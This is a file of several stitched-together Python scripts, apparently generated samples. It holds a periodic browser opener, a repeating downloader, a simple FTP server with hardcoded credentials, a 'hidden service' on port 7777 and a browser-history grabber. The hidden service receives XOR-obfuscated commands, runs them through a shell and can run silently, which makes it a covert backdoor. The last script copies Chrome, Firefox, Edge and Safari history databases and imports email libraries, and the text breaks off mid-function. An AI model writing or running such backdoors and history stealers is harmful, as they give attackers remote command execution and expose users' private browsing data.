#!/usr/bin/env python3
import sys
import webbrowser
import time
import os
import signal
from urllib.parse import urlparse
from datetime import datetime
from pathlib import Path


LOG_DIR = Path('./target')
LOG_FILE = LOG_DIR / 'reminder_tool.log'
PID_FILE = LOG_DIR / 'reminder_tool.pid'


def ensure_log_directory():
    """Create log directory if it doesn't exist"""
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        return True
    except Exception as e:
        print(f"Error creating log directory: {e}", file=sys.stderr)
        return False


def log_event(message, level="INFO"):
    """Append timestamped log entry to log file"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)

        return True
    except Exception as e:
        print(f"Error writing to log file: {e}", file=sys.stderr)
        return False


def validate_url(url):
    """Basic URL validation"""
    if not url:
        return False

    # Add scheme if missing
    if not url.startswith(('http://', 'https://', 'file://', 'ftp://')):
        url = 'https://' + url

    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc]) or result.scheme == 'file'
    except Exception:
        return False


def open_browser(url):
    """Open URL in default browser with error handling"""
    # Normalize URL
    if not url.startswith(('http://', 'https://', 'file://', 'ftp://')):
        url = 'https://' + url

    log_event(f"Attempting to open URL: {url}")

    try:
        opened = webbrowser.open(url, new=2)
        if opened:
            log_event(f"Successfully opened URL: {url}")
            return True
        else:
            error_msg = f"Failed to open URL: {url} - No suitable browser found"
            log_event(error_msg, level="ERROR")
            return False
    except Exception as e:
        error_msg = f"Exception while opening URL: {url} - {e}"
        log_event(error_msg, level="ERROR")
        return False


def daemonize():
    """Detach process from terminal and run as background daemon"""
    try:
        # First fork
        pid = os.fork()
        if pid > 0:
            # Exit parent process
            sys.exit(0)
    except OSError as e:
        log_event(f"Fork #1 failed: {e}", level="ERROR")
        sys.exit(1)

    # Decouple from parent environment
    os.chdir('/')
    os.setsid()
    os.umask(0)

    try:
        # Second fork
        pid = os.fork()
        if pid > 0:
            # Exit second parent process
            sys.exit(0)
    except OSError as e:
        log_event(f"Fork #2 failed: {e}", level="ERROR")
        sys.exit(1)

    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()

    with open(os.devnull, 'r') as devnull_in:
        os.dup2(devnull_in.fileno(), sys.stdin.fileno())

    with open(os.devnull, 'a+') as devnull_out:
        os.dup2(devnull_out.fileno(), sys.stdout.fileno())
        os.dup2(devnull_out.fileno(), sys.stderr.fileno())

    # Write PID file
    try:
        with open(PID_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log_event(f"Could not write PID file: {e}", level="ERROR")


def cleanup_handler(signum, frame):
    """Handle cleanup on termination signals"""
    log_event("Received termination signal, shutting down gracefully")
    try:
        if PID_FILE.exists():
            PID_FILE.unlink()
    except Exception:
        pass
    sys.exit(0)


def run_periodic_browser_open(url, interval, count, background):
    """Run browser opening periodically"""
    if background:
        log_event(f"Starting background process: URL={url}, interval={interval}s, count={count}")
        daemonize()
        log_event(f"Daemonized with PID: {os.getpid()}")
    else:
        log_event(f"Starting foreground process: URL={url}, interval={interval}s, count={count}")

    # Setup signal handlers for graceful shutdown
    signal.signal(signal.SIGTERM, cleanup_handler)
    signal.signal(signal.SIGINT, cleanup_handler)

    success_count = 0
    failure_count = 0

    for attempt in range(1, count + 1):
        log_event(f"Attempt {attempt} of {count}")

        if open_browser(url):
            success_count += 1
        else:
            failure_count += 1

        # Sleep between attempts (except after the last attempt)
        if attempt < count:
            log_event(f"Waiting {interval} seconds until next attempt")
            time.sleep(interval)

    log_event(f"Completed all attempts: {success_count} successful, {failure_count} failed")

    # Cleanup PID file
    try:
        if PID_FILE.exists():
            PID_FILE.unlink()
    except Exception:
        pass


def parse_arguments():
    """Parse command-line arguments with defaults"""
    # Default values for headless one-shot execution
    url = 'https://example.com'
    interval = 3600
    count = 1
    background = False

    # Parse if arguments are provided
    if len(sys.argv) >= 2:
        url = sys.argv[1].strip()

        i = 2
        while i < len(sys.argv):
            arg = sys.argv[i]

            if arg == '--interval' and i + 1 < len(sys.argv):
                try:
                    interval = int(sys.argv[i + 1])
                    if interval < 0:
                        print("Error: Interval must be non-negative", file=sys.stderr)
                        return None
                    i += 2
                except ValueError:
                    print(f"Error: Invalid interval value: {sys.argv[i + 1]}", file=sys.stderr)
                    return None
            elif arg == '--count' and i + 1 < len(sys.argv):
                try:
                    count = int(sys.argv[i + 1])
                    if count < 1:
                        print("Error: Count must be at least 1", file=sys.stderr)
                        return None
                    i += 2
                except ValueError:
                    print(f"Error: Invalid count value: {sys.argv[i + 1]}", file=sys.stderr)
                    return None
            elif arg == '--background':
                background = True
                i += 1
            else:
                print(f"Error: Unknown argument: {arg}", file=sys.stderr)
                return None

    return {
        'url': url,
        'interval': interval,
        'count': count,
        'background': background
    }


def main():
    # Ensure log directory exists
    if not ensure_log_directory():
        pass  # Continue without logging

    # Parse arguments
    args = parse_arguments()
    if args is None:
        return 1

    # Validate URL
    if not validate_url(args['url']):
        error_msg = f"Invalid URL provided: {args['url']}"
        log_event(error_msg, level="ERROR")
        return 1

    # Run the periodic browser opener
    try:
        run_periodic_browser_open(
            args['url'],
            args['interval'],
            args['count'],
            args['background']
        )
        return 0
    except Exception as e:
        log_event(f"Unexpected error: {e}", level="ERROR")
        return 1


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
import sys
import urllib.request
import urllib.parse
import os
import time
import json
import argparse
from datetime import datetime


STATE_FILE = "./target/download_state.json"


def log(message):
    """Print timestamped log message."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")


def load_state():
    """Load state from persistence file."""
    if not os.path.exists(STATE_FILE):
        return {"completed_iterations": 0}

    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
            log(f"Loaded state: {state['completed_iterations']} iterations completed")
            return state
    except Exception as e:
        log(f"Warning: Failed to load state file: {e}")
        return {"completed_iterations": 0}


def save_state(state):
    """Save state to persistence file."""
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f, indent=2)
        log(f"State saved: {state['completed_iterations']} iterations completed")
    except Exception as e:
        log(f"Warning: Failed to save state: {e}")


def download_file(url, target_dir):
    """Download file from URL to target directory."""
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)

        if not filename:
            filename = "downloaded_file"

        filepath = os.path.join(target_dir, filename)

        log(f"Downloading from {url}...")
        urllib.request.urlretrieve(url, filepath)
        log(f"✓ Successfully downloaded: {filepath}")
        return True

    except Exception as e:
        log(f"✗ Download failed: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Download utility with periodic execution and persistence"
    )
    parser.add_argument("url", help="URL to download from")
    parser.add_argument("notification_url", help="Notification URL to display after download")
    parser.add_argument(
        "--interval",
        type=int,
        default=None,
        help="Interval in seconds between downloads (required if max-iterations > 1)"
    )
    parser.add_argument(
        "--max-iterations",
        type=int,
        default=1,
        help="Maximum number of download iterations (default: 1)"
    )
    parser.add_argument(
        "--persist",
        action="store_true",
        help="Enable state persistence to resume after restart"
    )

    args = parser.parse_args()

    # Validate arguments
    if args.max_iterations > 1 and args.interval is None:
        print("Error: --interval is required when --max-iterations > 1", file=sys.stderr)
        sys.exit(1)

    if args.interval is not None and args.interval <= 0:
        print("Error: --interval must be a positive integer", file=sys.stderr)
        sys.exit(1)

    if args.max_iterations <= 0:
        print("Error: --max-iterations must be a positive integer", file=sys.stderr)
        sys.exit(1)

    target_dir = "./target"

    # Create target directory
    try:
        os.makedirs(target_dir, exist_ok=True)
        log(f"Target directory ready: {target_dir}")
    except Exception as e:
        log(f"✗ Failed to create directory '{target_dir}': {e}")
        sys.exit(1)

    # Load state if persistence is enabled
    state = {"completed_iterations": 0}
    if args.persist:
        state = load_state()

    # Execute download iterations
    try:
        while state["completed_iterations"] < args.max_iterations:
            iteration = state["completed_iterations"] + 1
            log(f"Starting iteration {iteration}/{args.max_iterations}")

            success = download_file(args.url, target_dir)

            if success:
                log(f"→ Please visit: {args.notification_url}")
                state["completed_iterations"] += 1

                if args.persist:
                    save_state(state)

                # Sleep between iterations (except after the last one)
                if state["completed_iterations"] < args.max_iterations:
                    log(f"Waiting {args.interval} seconds until next download...")
                    time.sleep(args.interval)
            else:
                log(f"Iteration {iteration} failed, continuing...")
                state["completed_iterations"] += 1

                if args.persist:
                    save_state(state)

                if state["completed_iterations"] < args.max_iterations:
                    log(f"Waiting {args.interval} seconds until next download...")
                    time.sleep(args.interval)

        log(f"✓ All iterations completed ({state['completed_iterations']}/{args.max_iterations})")

        # Clean up state file if persistence was enabled and all iterations completed
        if args.persist and os.path.exists(STATE_FILE):
            try:
                os.remove(STATE_FILE)
                log("State file cleaned up")
            except Exception as e:
                log(f"Warning: Failed to remove state file: {e}")

        sys.exit(0)

    except KeyboardInterrupt:
        log("\n✗ Interrupted by user")
        if args.persist:
            save_state(state)
            log(f"Progress saved: {state['completed_iterations']}/{args.max_iterations} iterations completed")
        sys.exit(1)
    except Exception as e:
        log(f"✗ Unexpected error: {e}")
        if args.persist:
            save_state(state)
        sys.exit(1)


if __name__ == "__main__":
    main()

import socket
import sys
import time
import base64
import hashlib
import subprocess
import os
from datetime import datetime

def log_event(message, silent=False):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f'[{timestamp}] {message}\n'
    if not silent:
        print(message)
    with open('diagnostic_log.txt', 'a') as f:
        f.write(log_line)

def derive_key(passphrase='default_key_phrase'):
    return hashlib.sha256(passphrase.encode()).digest()

def xor_encrypt_decrypt(data, key):
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        return f'STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}\nRETURN_CODE:{result.returncode}'
    except subprocess.TimeoutExpired:
        return 'ERROR: Command timeout'
    except Exception as e:
        return f'ERROR: {str(e)}'

def try_bind_with_retry(silent=False):
    max_attempts = 3
    backoff_delay = 1

    for attempt in range(1, max_attempts + 1):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('127.0.0.1', 7777))
            server_socket.listen(1)
            return server_socket
        except OSError as e:
            if e.errno == 48 or e.errno == 98:
                if attempt < max_attempts:
                    log_event(f'Port unavailable (attempt {attempt}/{max_attempts}), retrying in {backoff_delay}s', silent)
                    time.sleep(backoff_delay)
                    backoff_delay *= 2
                else:
                    log_event(f'Port unavailable after {max_attempts} attempts', silent)
                    return None
            else:
                log_event(f'Port binding error: {e}', silent)
                return None

    return None

def handle_client(conn, key, silent):
    conn.settimeout(5)
    max_commands = 10
    commands_processed = 0

    try:
        while commands_processed < max_commands:
            encrypted_data = conn.recv(4096)
            if not encrypted_data:
                break

            decrypted_data = xor_encrypt_decrypt(encrypted_data, key)
            command = decrypted_data.decode('utf-8', errors='ignore').strip()

            if not command:
                break

            log_event(f'Executing command: {command[:50]}', silent)
            result = execute_command(command)

            encrypted_result = xor_encrypt_decrypt(result.encode('utf-8'), key)
            conn.sendall(encrypted_result)

            commands_processed += 1

            if command.lower() in ('exit', 'quit'):
                break

    except socket.timeout:
        log_event('Client connection timeout', silent)
    except Exception as e:
        log_event(f'Client handling error: {e}', silent)

def main():
    silent = '--silent' in sys.argv
    server_socket = None
    encryption_key = derive_key()

    try:
        server_socket = try_bind_with_retry(silent)

        if server_socket is None:
            sys.exit(1)

        server_socket.settimeout(10)
        log_event('Hidden service ready on port 7777', silent)

        try:
            conn, addr = server_socket.accept()
            log_event(f'Client connected from {addr}', silent)
            handle_client(conn, encryption_key, silent)
            conn.close()
        except socket.timeout:
            log_event('No client connected within timeout period', silent)

    except Exception as e:
        log_event(f'Unexpected error: {e}', silent)
        sys.exit(1)
    finally:
        if server_socket:
            server_socket.close()
            log_event('Server socket closed', silent)

    sys.exit(0)

if __name__ == '__main__':
    main()

#!/usr/bin/env python3
"""Basic FTP server with authentication, robust error handling, and logging."""

import os
import socket
import sys
import traceback
from pathlib import Path
from datetime import datetime


# Authentication credentials
FTP_HOST = '127.0.0.1'
FTP_PORT = 2121
FTP_USERNAME = 'ftpuser'
FTP_PASSWORD = 'ftppass123'


class Logger:
    """Simple logger for FTP server operations."""

    @staticmethod
    def log(level, message):
        """Log a message with timestamp and level."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] [{level}] {message}")

    @staticmethod
    def info(message):
        Logger.log("INFO", message)

    @staticmethod
    def error(message):
        Logger.log("ERROR", message)

    @staticmethod
    def warning(message):
        Logger.log("WARNING", message)

    @staticmethod
    def success(message):
        Logger.log("SUCCESS", message)


class SimpleFTPServer:
    def __init__(self, host=FTP_HOST, port=FTP_PORT, root_dir='./target'):
        self.host = host
        self.port = port
        self.root_dir = Path(root_dir).resolve()
        self.root_dir.mkdir(exist_ok=True)
        Logger.info(f"Root directory created/verified: {self.root_dir}")

    def handle_client(self, client_sock, addr):
        """Handle single FTP client session."""
        Logger.info(f"Client connected from {addr[0]}:{addr[1]}")

        authenticated = False
        username = None
        data_conn = None
        binary_mode = True

        try:
            client_sock.send(b"220 Simple FTP Server Ready\r\n")
            Logger.info("Welcome message sent to client")

            while True:
                try:
                    data = client_sock.recv(1024)
                    if not data:
                        Logger.info("Client closed connection")
                        break

                    data = data.decode('utf-8', errors='ignore').strip()
                    cmd_parts = data.split(maxsplit=1)
                    cmd = cmd_parts[0].upper()
                    arg = cmd_parts[1] if len(cmd_parts) > 1 else ''

                    Logger.info(f"Received command: {cmd} {arg if cmd != 'PASS' else '***'}")

                    if cmd == 'USER':
                        username = arg
                        if username == FTP_USERNAME:
                            client_sock.send(b"331 User name okay, need password\r\n")
                            Logger.info(f"Valid username received: {username}")
                        else:
                            client_sock.send(b"530 Invalid username\r\n")
                            Logger.warning(f"Invalid username attempt: {username}")
                            username = None

                    elif cmd == 'PASS':
                        if username == FTP_USERNAME and arg == FTP_PASSWORD:
                            authenticated = True
                            client_sock.send(b"230 User logged in\r\n")
                            Logger.success(f"User '{username}' authenticated successfully from {addr[0]}")
                        else:
                            authenticated = False
                            client_sock.send(b"530 Authentication failed\r\n")
                            Logger.warning(f"Authentication failed for user '{username}' from {addr[0]}")

                    elif cmd == 'SYST':
                        client_sock.send(b"215 UNIX Type: L8\r\n")
                        Logger.info("System type sent")

                    elif cmd == 'PWD':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("PWD command rejected: not authenticated")
                            continue
                        client_sock.send(b"257 \"/\" is current directory\r\n")
                        Logger.info("Current directory sent")

                    elif cmd == 'TYPE':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("TYPE command rejected: not authenticated")
                            continue
                        binary_mode = arg.upper() == 'I'
                        client_sock.send(b"200 Type set\r\n")
                        Logger.info(f"Transfer type set to {'binary' if binary_mode else 'ascii'}")

                    elif cmd == 'PASV':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("PASV command rejected: not authenticated")
                            continue

                        try:
                            data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            data_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            data_sock.bind((self.host, 0))
                            data_sock.listen(1)
                            _, data_port = data_sock.getsockname()

                            h = self.host.replace('.', ',')
                            p1, p2 = data_port >> 8, data_port & 0xff
                            msg = f"227 Entering Passive Mode ({h},{p1},{p2})\r\n"
                            client_sock.send(msg.encode())
                            Logger.info(f"Passive mode enabled on port {data_port}")

                            data_conn, data_addr = data_sock.accept()
                            data_sock.close()
                            Logger.info(f"Data connection established from {data_addr[0]}:{data_addr[1]}")
                        except Exception as e:
                            Logger.error(f"Failed to establish data connection: {e}")
                            client_sock.send(b"425 Can't open data connection\r\n")
                            if 'data_sock' in locals():
                                data_sock.close()

                    elif cmd == 'LIST':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("LIST command rejected: not authenticated")
                            continue

                        if data_conn:
                            try:
                                client_sock.send(b"150 Opening data connection\r\n")
                                Logger.info("Sending directory listing")
                                file_count = 0
                                for item in self.root_dir.iterdir():
                                    line = f"-rw-r--r-- 1 user group {item.stat().st_size} Jan 1 00:00 {item.name}\r\n"
                                    data_conn.send(line.encode())
                                    file_count += 1
                                data_conn.close()
                                data_conn = None
                                client_sock.send(b"226 Transfer complete\r\n")
                                Logger.success(f"Directory listing sent ({file_count} items)")
                            except Exception as e:
                                Logger.error(f"Error sending directory listing: {e}")
                                client_sock.send(b"550 Failed to send listing\r\n")
                                if data_conn:
                                    data_conn.close()
                                    data_conn = None
                        else:
                            client_sock.send(b"425 Use PASV first\r\n")
                            Logger.warning("LIST command rejected: no data connection")

                    elif cmd == 'RETR':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("RETR command rejected: not authenticated")
                            continue

                        filepath = self.root_dir / arg
                        if filepath.exists() and filepath.is_file() and data_conn:
                            try:
                                client_sock.send(b"150 Opening data connection\r\n")
                                Logger.info(f"Starting file download: {arg}")
                                with open(filepath, 'rb') as f:
                                    file_size = 0
                                    while True:
                                        chunk = f.read(8192)
                                        if not chunk:
                                            break
                                        data_conn.sendall(chunk)
                                        file_size += len(chunk)
                                data_conn.close()
                                data_conn = None
                                client_sock.send(b"226 Transfer complete\r\n")
                                Logger.success(f"File downloaded successfully: {arg} ({file_size} bytes)")
                            except Exception as e:
                                Logger.error(f"Error downloading file {arg}: {e}")
                                client_sock.send(b"550 Transfer failed\r\n")
                                if data_conn:
                                    data_conn.close()
                                    data_conn = None
                        else:
                            if not data_conn:
                                client_sock.send(b"425 Use PASV first\r\n")
                                Logger.warning("RETR command rejected: no data connection")
                            else:
                                client_sock.send(b"550 File not found\r\n")
                                Logger.warning(f"File not found: {arg}")

                    elif cmd == 'STOR':
                        if not authenticated:
                            client_sock.send(b"530 Not logged in\r\n")
                            Logger.warning("STOR command rejected: not authenticated")
                            continue

                        filepath = self.root_dir / arg
                        if data_conn:
                            try:
                                client_sock.send(b"150 Opening data connection\r\n")
                                Logger.info(f"Starting file upload: {arg}")
                                file_size = 0
                                with open(filepath, 'wb') as f:
                                    while True:
                                        chunk = data_conn.recv(8192)
                                        if not chunk:
                                            break
                                        f.write(chunk)
                                        file_size += len(chunk)
                                data_conn.close()
                                data_conn = None
                                client_sock.send(b"226 Transfer complete\r\n")
                                Logger.success(f"File uploaded successfully: {arg} ({file_size} bytes)")
                            except Exception as e:
                                Logger.error(f"Error uploading file {arg}: {e}")
                                client_sock.send(b"550 Transfer failed\r\n")
                                if data_conn:
                                    data_conn.close()
                                    data_conn = None
                                if filepath.exists():
                                    filepath.unlink()
                        else:
                            client_sock.send(b"425 Use PASV first\r\n")
                            Logger.warning("STOR command rejected: no data connection")

                    elif cmd == 'QUIT':
                        client_sock.send(b"221 Goodbye\r\n")
                        Logger.info("Client requested disconnect")
                        break

                    else:
                        client_sock.send(b"502 Command not implemented\r\n")
                        Logger.warning(f"Unimplemented command: {cmd}")

                except socket.error as e:
                    Logger.error(f"Socket error during command processing: {e}")
                    break
                except Exception as e:
                    Logger.error(f"Unexpected error during command processing: {e}")
                    Logger.error(traceback.format_exc())
                    try:
                        client_sock.send(b"451 Internal error\r\n")
                    except:
                        pass

        except socket.error as e:
            Logger.error(f"Socket error in client handler: {e}")
        except Exception as e:
            Logger.error(f"Unexpected error in client handler: {e}")
            Logger.error(traceback.format_exc())
        finally:
            if data_conn:
                try:
                    data_conn.close()
                    Logger.info("Data connection closed")
                except:
                    pass
            try:
                client_sock.close()
                Logger.info(f"Client disconnected: {addr[0]}:{addr[1]}")
            except:
                pass

    def start(self):
        """Start FTP server and handle single session."""
        server_sock = None

        try:
            Logger.info("=" * 60)
            Logger.info("Starting FTP Server")
            Logger.info("=" * 60)
            Logger.info(f"Host: {self.host}")
            Logger.info(f"Port: {self.port}")
            Logger.info(f"Root directory: {self.root_dir}")
            Logger.info(f"Username: {FTP_USERNAME}")
            Logger.info("=" * 60)

            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            try:
                server_sock.bind((self.host, self.port))
                Logger.success(f"Server socket bound to {self.host}:{self.port}")
            except OSError as e:
                if e.errno == 48 or e.errno == 98:  # Address already in use
                    Logger.error(f"Port {self.port} is already in use. Please choose a different port or stop the conflicting service.")
                elif e.errno == 99:  # Cannot assign requested address
                    Logger.error(f"Cannot bind to {self.host}:{self.port}. Network may be offline or address is invalid.")
                else:
                    Logger.error(f"Failed to bind to {self.host}:{self.port}: {e}")
                return
            except Exception as e:
                Logger.error(f"Failed to bind to {self.host}:{self.port}: {e}")
                return

            server_sock.listen(1)
            Logger.info("Server is listening for incoming connections...")
            Logger.info("Waiting for client connection (single session mode)...")

            try:
                server_sock.settimeout(None)  # Block indefinitely
                client_sock, addr = server_sock.accept()
                self.handle_client(client_sock, addr)
            except socket.timeout:
                Logger.warning("Connection timeout - no client connected")
            except socket.error as e:
                Logger.error(f"Error accepting connection: {e}")
            except KeyboardInterrupt:
                Logger.info("Server interrupted by user")

        except socket.error as e:
            Logger.error(f"Socket error during server startup: {e}")
        except Exception as e:
            Logger.error(f"Unexpected error during server startup: {e}")
            Logger.error(traceback.format_exc())
        finally:
            if server_sock:
                try:
                    server_sock.close()
                    Logger.info("Server socket closed")
                except:
                    pass

            Logger.info("=" * 60)
            Logger.info("Server shutdown complete")
            Logger.info("=" * 60)


def main():
    """Main entry point."""
    try:
        server = SimpleFTPServer()
        server.start()
    except KeyboardInterrupt:
        Logger.info("\nServer interrupted by user")
    except Exception as e:
        Logger.error(f"Fatal error: {e}")
        Logger.error(traceback.format_exc())
        sys.exit(1)

    sys.exit(0)


if __name__ == '__main__':
    main()

#!/usr/bin/env python3
import sys
import smtplib
import os
import time
import json
import sqlite3
import shutil
import subprocess
import platform
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from pathlib import Path

def get_browser_history():
    history_data = []
    system = platform.system()
    home = str(Path.home())

    browser_paths = {
        'Chrome': {
            'Windows': os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
            'Darwin': os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History'),
            'Linux': os.path.join(home, '.config', 'google-chrome', 'Default', 'History')
        },
        'Firefox': {
            'Windows': os.path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
            'Darwin': os.path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles'),
            'Linux': os.path.join(home, '.mozilla', 'firefox')
        },
        'Edge': {
            'Windows': os.path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            'Darwin': os.path.join(home, 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'History'),
            'Linux': os.path.join(home, '.config', 'microsoft-edge', 'Default', 'History')
        },
        'Safari': {
            'Darwin': os.path.join(home, 'Library', 'Safari', 'History.db')
        }
    }

    for browser, paths in browser_paths.items():
        if system not in paths:
            continue

        db_path = paths[system]

        if browser == 'Firefox' and os.path.isdir(db_path):
            try:
                for profile in os.listdir(db_path):
                    profile_path = os.path.join(db_path, profile)
                    if os.path.isdir(profile_path):
                        places_db = os.path.join(profile_path, 'places.sqlite')
                        if os.path.exists(places_db):
                            history_data.extend(read_firefox_history(places_db, browser))
            except Exception:
                pass
        elif os.path.exists(db_path):
            if browser == 'Safari':
                history_data.extend(read_safari_history(db_path, browser))
            else:
                history_data.extend(read_chromium_history(db_path, browser))

    return history_data

def read_chromium_history(db_path, browser_name):
    results = []
    temp_db = f'temp_history_{int(time.time())}.db'

    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")

        for row in cursor.fetchall():
            results.append({
                'browser': browser_name,
                'url': row[0],
                'title': row[1],
                'visit_count': row[2],
                'timestamp': row[3]
            })

        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception:
                pass

    return results

def read_firefox_history(db_path, browser_name):
    results = []
    temp_db = f'temp_places_{int(time.time())}.db'

    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")

        for row in cursor.fetchall():
            results.append({
                'browser': browser_name,
                'url': row[0],
                'title': row[1],
                'visit_count': row[2],
                'timestamp': row[3]
            })

        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_db):
